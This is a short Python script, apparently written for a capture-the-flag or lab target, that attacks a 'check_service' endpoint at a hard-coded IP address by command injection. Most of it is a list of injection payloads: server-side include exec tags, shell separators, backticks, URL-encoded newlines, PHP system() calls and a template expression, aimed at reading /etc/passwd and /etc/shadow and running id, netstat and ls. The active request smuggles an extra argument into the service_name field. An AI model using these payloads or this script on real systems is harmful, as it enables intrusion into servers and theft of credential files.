import requests

url = "http://13.36.65.25:32777/check_service"

# add headers
headers = {
    'Content-Type': 'application/json',
}
commands = [
    "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->",
    "<!--#exec cmd=\"/bin/cat /etc/shadow\"-->",
    "<!--#exec cmd=\"/usr/bin/id;-->",
    "<!--#exec cmd=\"/usr/bin/id;-->",
    "/index.html|id|",
    ";id;",
    ";id",
    ";netstat -a;",
    ";system('cat%20/etc/passwd')",
    ";id;",
    "|id",
    "|/usr/bin/id",
    "|id|",
    "|/usr/bin/id|",
    "||/usr/bin/id|",
    "|id;",
    "||/usr/bin/id;",
    ";id|",
    ";|/usr/bin/id|",
    "\n/bin/ls -al\n",
    "\n/usr/bin/id\n",
    "\nid\n",
    "\n/usr/bin/id;\n",
    "id;\n",
    "/usr/bin/id|",
    "\nid|",
    ";usr/bin/id\n",
    ";nid\n",
    "`id`",
    "`/usr/bin/id`",
    "a);id",
    "a;id",
    "a);id;",
    "a;id;",
    "a);id|",
    "a;id|",
    "a)|id",
    "a|id",
    "a)|id;",
    "a|id",
    "|/bin/ls -al",
    "a);/usr/bin/id",
    "a;/usr/bin/id",
    "a);/usr/bin/id;",
    "a;/usr/bin/id;",
    "a);/usr/bin/id|",
    "a;/usr/bin/id|",
    "a)|/usr/bin/id",
    "a|/usr/bin/id",
    "a)|/usr/bin/id;",
    "a|/usr/bin/id",
    ";system('cat%20/etc/passwd')",
    ";system('id')",
    ";system('/usr/bin/id')",
    "%0Acat%20/etc/passwd",
    "%0A/usr/bin/id",
    "%0Aid",
    "%0A/usr/bin/id%0A",
    "%0Aid%0A",
    "& ping -i 30 127.0.0.1 &",
    "& ping -n 30 127.0.0.1 &",
    "%0a ping -i 30 127.0.0.1 %0a",
    "`ping 127.0.0.1`",
    "| id",
    "& id",
    "; id",
    "%0a id %0a",
    "`id`",
    "$;/usr/bin/id",
   "cat /etc/hosts",
    "$(`cat /etc/passwd`)",
    "cat /etc/passwd",
    "%0Acat%20/etc/passwd",
    "{{ get_user_file(\"/etc/passwd\") }}",
    "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->",
    "<!--#exec cmd=\"/bin/cat /etc/shadow\"-->",
    "<!--#exec cmd=\"/usr/bin/id;-->",
    "system('cat /etc/passwd');",
    "<?php system(\"cat /etc/passwd\");?>"
]

# send post request
# for command in commands:
#     response = requests.post(url, headers=headers, data='{"service_name": "' + command + '"}')
#     print(response.text)

# payload = {"service_name":"-t custom 'ls -ls /app/'"}
# response = requests.post(url, headers=headers, json=payload)


response = requests.post(url, headers=headers, data='{"service_name":  "-t custom \'tail *\'"}')

# print response
print(response.text)
